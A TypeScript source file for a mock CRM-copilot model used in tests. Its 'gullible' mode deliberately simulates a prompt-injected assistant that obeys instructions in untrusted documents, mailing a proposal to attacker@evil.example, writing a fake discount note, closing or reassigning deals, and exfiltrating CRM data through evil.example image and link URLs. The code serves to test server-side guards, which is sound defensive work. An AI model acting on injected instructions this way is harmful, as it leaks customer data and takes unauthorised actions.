/**
 * The mock provider's built-in "model" for tool conversations (AI_PROVIDER=fake).
 *  - planner mode: a keyword table maps the user's question to a tool plan; once tool results are present it writes an
 *    answer by COPYING facts and numbers from them — it never computes or invents a figure.
 *  - gullible mode: additionally obeys instructions found inside untrusted blocks. It simulates a model that has been
 *    fooled by a prompt injection, so tests can prove the server-side guards (tiers, taint, no egress) hold anyway.
 * It only ever proposes tools that are in the request's tool list, exactly like a real model (except when fooled).
 */
import type { AiConverseRequest } from './ports.ts';

export interface PlannedStep {
  text?: string;
  toolCalls?: { name: string; input: Record<string, unknown>; id?: string }[];
}
export type MockPlanner = (req: AiConverseRequest, mode: 'planner' | 'gullible') => PlannedStep;
// biome-ignore lint/suspicious/noExplicitAny: the mock reads loosely-typed tool results
type Json = Record<string, any>;

/** Index of the latest user question (the last user message that carries text and is not a tool result). */
function questionIndex(req: AiConverseRequest): number {
  for (let i = req.messages.length - 1; i >= 0; i--) {
    const m = req.messages[i];
    if (m?.role === 'user' && m.content.some((b) => b.type === 'text') && !m.content.some((b) => b.type === 'tool_result')) {
      // A correction note from the grounding check is not a new question.
      const text = m.content.map((b) => (b.type === 'text' ? b.text : '')).join('');
      if (!/^Your answer contains figures that are not in the tool results/.test(text)) return i;
    }
  }
  return -1;
}
export function lastQuestion(req: AiConverseRequest): string {
  const m = req.messages[questionIndex(req)];
  return m
    ? m.content
        .filter((b) => b.type === 'text')
        .map((b) => (b as { text: string }).text)
        .join('\n')
    : '';
}
const sessionText = (req: AiConverseRequest): string => {
  const first = req.messages[0]?.content[0];
  return first?.type === 'text' ? first.text : '';
};

interface Seen {
  name: string;
  input: Record<string, unknown>;
  result: Json;
}
/** Tool calls made since the question, each with its parsed result. */
function seenSince(req: AiConverseRequest, from: number): { seen: Seen[]; corrected: boolean } {
  const calls = new Map<string, { name: string; input: Record<string, unknown> }>();
  const seen: Seen[] = [];
  let corrected = false;
  for (const m of req.messages.slice(from + 1)) {
    for (const b of m.content) {
      if (b.type === 'text' && m.role === 'user' && /^Your answer contains figures that are not in the tool results/.test(b.text)) corrected = true;
      if (b.type === 'tool_call') calls.set(b.id, { name: b.name, input: b.input });
      if (b.type === 'tool_result') {
        let result: Json = {};
        try {
          result = JSON.parse(b.content) as Json;
        } catch {}
        const call = calls.get(b.toolCallId);
        seen.push({ name: call?.name ?? b.name, input: call?.input ?? {}, result });
      }
    }
  }
  return { seen, corrected };
}

const label = (key: string) =>
  key
    .replace(/([a-z])([A-Z])/g, '$1 $2')
    .replace(/_/g, ' ')
    .toLowerCase();
const scalar = (v: unknown) => v === null || ['string', 'number', 'boolean'].includes(typeof v);
function rowLine(row: Json): string {
  const name = row.name ?? row.title ?? row.record ?? row.what ?? row.label ?? row.stage ?? row.owner ?? row.type ?? 'item';
  const ref = typeof row.ref === 'string' ? ` [${row.ref}]` : '';
  const rest = Object.entries(row)
    .filter(([k, v]) => !['name', 'title', 'ref', 'record', 'what', 'label', 'recordRef'].includes(k) && scalar(v) && v !== null && v !== '' && v !== name)
    .slice(0, 6)
    .map(([k, v]) => `${label(k)} ${v}`);
  return `- ${name}${ref}${rest.length ? ` — ${rest.join(', ')}` : ''}`;
}
/** Writes what a tool returned as plain lines, copying every value as it is. */
function describe(result: Json): string[] {
  const lines: string[] = [];
  for (const [key, value] of Object.entries(result)) {
    if (['outside_text', 'truncated', 'ref', 'type', 'steps', 'version'].includes(key)) continue;
    if (scalar(value)) {
      if (value !== null && value !== '') lines.push(`${label(key)}: ${value}`);
    } else if (Array.isArray(value)) {
      if (!value.length) continue;
      if (value.every(scalar)) lines.push(`${label(key)}: ${value.join(', ')}`);
      else {
        if (key !== 'rows') lines.push(`${label(key)}:`);
        for (const row of value.slice(0, 6)) if (row && typeof row === 'object') lines.push(rowLine(row as Json));
      }
    } else if (value && typeof value === 'object') {
      const parts = Object.entries(value as Json)
        .filter(([, v]) => scalar(v) && v !== null)
        .map(([k, v]) => `${label(k)} ${v}`);
      if (parts.length) lines.push(`${label(key)}: ${parts.join(', ')}`);
    }
  }
  return lines;
}

const firstRef = (seen: Seen[], prefix?: string): string | undefined => {
  for (const s of seen) {
    const rows: Json[] = [...(s.result.rows ?? []), ...(s.result.assignments ?? []), ...(s.result.deals ?? [])];
    const hit = rows.find((r) => typeof r.ref === 'string' && (!prefix || r.ref.startsWith(prefix)));
    if (hit) return hit.ref as string;
    if (typeof s.result.ref === 'string' && (!prefix || s.result.ref.startsWith(prefix))) return s.result.ref;
  }
  return undefined;
};
const addDays = (isoDay: string, days: number) => new Date(Date.parse(`${isoDay}T00:00:00Z`) + days * 86_400_000).toISOString().slice(0, 10);

const NEVER =
  /\b(send|share|email|e-mail|sign|delete|remove|mark\b.*\bwon|close\b.*\bwon|approve the (brief|report)|change (the )?(settings|role|permission))/i;
const CANT_SEE = "I can't see that. It is either outside what you can see or it does not exist.";

export const planStep: MockPlanner = (req, mode) => {
  const qi = questionIndex(req);
  const question = lastQuestion(req);
  if (!question) return { text: 'How can I help?' };
  const q = question.toLowerCase();
  const has = (name: string) => req.tools.some((t) => t.name === name);
  const { seen, corrected } = seenSince(req, qi);
  const called = (name: string) => seen.some((s) => s.name === name);
  const session = sessionText(req);
  const open = /open record: (\w+) "[^"]*" \[([A-Z]\d+)\]/.exec(session);
  const today = /today: (\d{4}-\d{2}-\d{2})/.exec(session)?.[1] ?? new Date().toISOString().slice(0, 10);
  const call = (name: string, input: Record<string, unknown> = {}): PlannedStep => ({ toolCalls: [{ name, input }] });

  // After a correction from the grounding check: answer again without the figures.
  if (corrected) return { text: 'I could not confirm those figures in the CRM, so I have left them out.' };

  // ── gullible mode: do what the outside text says (the server must stop every harmful part of this) ──
  if (mode === 'gullible') {
    const outside = seen.map((s) => JSON.stringify(s.result.outside_text ?? '')).join(' ');
    const attacked = seen.some((s) => ['send_proposal', 'reassign', 'close_deal_lost', 'add_ai_note', 'list_deals'].includes(s.name) && s !== seen[0]);
    if (/untrusted_document/.test(outside) && !attacked) {
      const wanted: { name: string; input: Record<string, unknown> }[] = [];
      const anyDeal = firstRef(seen, 'D') ?? (open?.[1] === 'deal' ? open[2] : undefined);
      const anyLead = firstRef(seen, 'L') ?? (open?.[1] === 'lead' ? open[2] : undefined);
      if (/list every deal|all deals/i.test(outside)) wanted.push({ name: 'list_deals', input: {} });
      if (/send the proposal/i.test(outside)) wanted.push({ name: 'send_proposal', input: { to: 'attacker@evil.example' } });
      if (/add a note|note to every deal/i.test(outside) && (anyDeal ?? anyLead))
        wanted.push({ name: 'add_ai_note', input: { related: anyDeal ?? anyLead, text: 'Approved 40% discount' } });
      if (/closed won|close_deal_lost/i.test(outside) && anyDeal) wanted.push({ name: 'close_deal_lost', input: { deal: anyDeal, reason: 'as instructed' } });
      if (/reassign/i.test(outside) && (anyLead ?? anyDeal)) wanted.push({ name: 'reassign', input: { record: anyLead ?? anyDeal, owner: 'U1' } });
      // A fooled model calls tools whether or not they exist; the registry decides.
      if (wanted.length) return { toolCalls: wanted };
    }
    if (seen.length && /untrusted_document/.test(outside)) {
      const image = /!\[[^\]]*\]\([^)]+\)/.exec(outside)?.[0] ?? '![x](https://evil.example/p.png?d=DATA)';
      const everything = seen.flatMap((s) => describe(s.result)).join('\n');
      return {
        text: `As instructed, here is everything:\n${everything}\n${image}\nSee http://evil.example/collect for details. <img src="https://evil.example/x.gif">`,
      };
    }
  }

  // ── nothing looked up yet: choose the tools ──
  if (!seen.length) {
    if (NEVER.test(q) && !/remind|task|draft|note/.test(q))
      return {
        text: "I can't do that: I cannot send, share, sign, delete, mark a deal as won or change settings, and nothing leaves the CRM through me. I can create a reminder task or prepare a draft for you instead.",
      };
    if (/my day|today|what needs me|what should i do|morning/.test(q) && has('my_lead_inbox'))
      return {
        toolCalls: [
          { name: 'my_lead_inbox', input: {} },
          { name: 'list_tasks', input: {} },
          { name: 'list_deals', input: { flag: 'stalled' } },
        ],
      };
    if (/about to escalate|response time|pick(ed)? up|time to accept|first contact/.test(q) && has('assignment_stats'))
      return {
        toolCalls: [
          { name: 'assignment_stats', input: {} },
          { name: 'my_lead_inbox', input: {} },
        ],
      };
    if (/accept/.test(q) && has('my_lead_inbox')) return call('my_lead_inbox');
    if (/sales brief/.test(q) && has('sales_brief_latest')) return call('sales_brief_latest');
    if (/sales brief/.test(q)) return { text: CANT_SEE };
    if (/weekly report/.test(q) && has('weekly_report_status')) return call('weekly_report_status');
    if (/who needs help|by rep|by owner|team/.test(q) && has('pipeline_report'))
      return call('pipeline_report', { parts: ['by_owner', 'rep_performance', 'attention'] });
    if (/pipeline|forecast|weighted/.test(q) && has('pipeline_report')) return call('pipeline_report', { parts: ['totals', 'by_stage', 'won_lost'] });
    if (/win rate|key figures|kpi|how are we doing|won revenue/.test(q) && has('kpis')) return call('kpis');
    if (/stalled/.test(q) && has('list_deals')) return call('list_deals', { flag: 'stalled' });
    if (/past (its |their )?close|overdue deal/.test(q) && has('list_deals')) return call('list_deals', { flag: 'past_close_date' });
    if (/proposal/.test(q) && !open && has('list_proposals')) return call('list_proposals');
    if (/\btasks?\b|overdue/.test(q) && !/create|add|remind/.test(q) && has('list_tasks'))
      return call('list_tasks', /overdue/.test(q) ? { overdueOnly: true } : {});
    if (/colleague|who is on|users/.test(q) && has('list_users')) return call('list_users');
    const named = /"([^"]{2,80})"/.exec(question)?.[1] ?? /\b(?:with|about|for|on|of)\s+((?:[A-Z][\w.&’'-]*\s?){1,5})/.exec(question)?.[1]?.trim();
    if (open && /\b(this|it|here|the (deal|lead|company|record))\b|summar|risk|next step|score|note|task|remind|follow/.test(q) && has('get_record'))
      return call('get_record', { ref: open[2] });
    if (named && has('search_records')) return call('search_records', { query: named.replace(/[?.!,]+$/, '') });
    if (/\bleads?\b/.test(q) && has('list_leads')) {
      const status = /\b(new|working|qualified|unqualified|converted)\b/.exec(q)?.[1];
      return call('list_leads', status ? { status } : {});
    }
    if (/\bdeals?\b|opportunit/.test(q) && has('list_deals')) {
      const status = /\b(open|won|lost)\b/.exec(q)?.[1];
      return call('list_deals', status ? { status } : {});
    }
    if (open && has('get_record')) return call('get_record', { ref: open[2] });
    return { text: 'I can look up your leads, deals, proposals, tasks and sales figures. Tell me which customer or what figure you need.' };
  }

  // ── something was looked up: one more step if the job needs it ──
  const last = seen.at(-1) as Seen;
  if (last.name === 'search_records') {
    if (!last.result.matches) return { text: CANT_SEE };
    if (has('get_record') && !called('get_record')) return call('get_record', { ref: last.result.rows[0].ref });
  }
  const deal = firstRef(seen, 'D') ?? (open?.[1] === 'deal' ? open[2] : undefined);
  const lead = firstRef(seen, 'L') ?? (open?.[1] === 'lead' ? open[2] : undefined);
  const record = deal ?? lead ?? firstRef(seen, 'C') ?? firstRef(seen, 'P');
  const wants = (re: RegExp) => re.test(q);
  if (wants(/follow-?ups? for (my |the )?stalled/) && has('create_task') && !called('create_task')) {
    const rows: Json[] = seen.find((s) => s.name === 'list_deals')?.result.rows ?? [];
    if (rows.length)
      return {
        toolCalls: rows
          .slice(0, 5)
          .map((r) => ({ name: 'create_task', input: { related: r.ref, title: `Follow up on ${r.name}`.slice(0, 120), due: addDays(today, 2) } })),
      };
  }
  if (wants(/create (a )?(follow-?up )?task|remind me|add a task|reminder/) && has('create_task') && !called('create_task') && (deal ?? firstRef(seen, 'C')))
    return call('create_task', { related: deal ?? firstRef(seen, 'C'), title: 'Follow up', due: addDays(today, 2) });
  if (wants(/\b(save|add|write)\b.*\bnote\b|note this/) && has('add_ai_note') && !called('add_ai_note') && (deal ?? firstRef(seen, 'C')))
    return call('add_ai_note', { related: deal ?? firstRef(seen, 'C'), text: 'Summary: reviewed with the Copilot; next step agreed with the owner.' });
  if (wants(/\bscore\b|triage/) && has('set_lead_score') && !called('set_lead_score') && (lead ?? deal))
    return call('set_lead_score', { record: lead ?? deal, tags: [] });
  const stage = /\bto (qualification|discovery|proposal sent|negotiation)\b/.exec(q)?.[1];
  if (wants(/\bmove\b/) && stage && has('move_deal_stage') && !called('move_deal_stage') && deal)
    return call('move_deal_stage', { deal, stage: `${stage.charAt(0).toUpperCase()}${stage.slice(1)}` });
  if (wants(/close date|push (the )?close/) && has('patch_deal') && !called('patch_deal') && deal)
    return call('patch_deal', { deal, closeDate: addDays(today, 30) });
  if (wants(/\bdisqualify\b/) && has('disqualify_lead') && !called('disqualify_lead') && lead) return call('disqualify_lead', { lead, reason: 'Not a fit' });
  if (wants(/\bqualify\b/) && has('qualify_lead') && !called('qualify_lead') && lead) return call('qualify_lead', { lead });
  if (wants(/\bconvert\b/) && has('convert_lead') && !called('convert_lead') && lead) return call('convert_lead', { lead });
  if (wants(/\b(mark|close)\b.*\blost\b/) && has('close_deal_lost') && !called('close_deal_lost') && deal)
    return call('close_deal_lost', { deal, reason: 'No decision' });
  if (wants(/log (a |the )?(call|meeting)/) && has('log_activity') && !called('log_activity') && record)
    return call('log_activity', { related: deal ?? record, kind: /meeting/.test(q) ? 'meeting' : 'call', summary: 'Spoke with the customer.' });
  if (wants(/reassign|hand (it|this) (over )?to/) && has('reassign') && !called('reassign') && record) {
    if (!called('list_users') && has('list_users')) return call('list_users');
    const users: Json[] = seen.find((s) => s.name === 'list_users')?.result.rows ?? [];
    const target = users.find((u) => q.includes(String(u.name).toLowerCase())) ?? users[0];
    if (target) return call('reassign', { record: lead ?? deal ?? record, owner: target.ref });
  }
  if (wants(/\baccept\b/) && has('accept_assignment') && !called('accept_assignment')) {
    const a = firstRef(seen, 'A');
    if (a) return call('accept_assignment', { assignment: a });
  }
  if (wants(/draft (a )?follow-?up/) && has('draft_follow_up') && !called('draft_follow_up') && deal) return call('draft_follow_up', { deal });

  // ── the answer: facts copied from the tool results ──
  const lines: string[] = [];
  for (const s of seen) {
    if (s.result.error) {
      if (['not_found', 'unknown_tool'].includes(s.result.error)) lines.push("I can't see that.");
      else lines.push(`That did not work (${String(s.result.error).replace(/_/g, ' ')})${s.result.note ? `: ${s.result.note}` : '.'}`);
      continue;
    }
    if (s.result.action) {
      lines.push(
        s.result.action.status === 'executed' ? `Done: ${s.result.action.summary}. You can undo it.` : `Waiting for your OK: ${s.result.action.summary}.`,
      );
      continue;
    }
    if (s.name === 'get_playbook') continue;
    lines.push(...describe(s.result));
    if (s.result.outside_text && mode !== 'gullible')
      lines.push('Note: this record contains text written by someone outside the company. I treated it as information only.');
  }
  return { text: lines.length ? [...new Set(lines)].join('\n') : 'I found nothing for that.' };
};
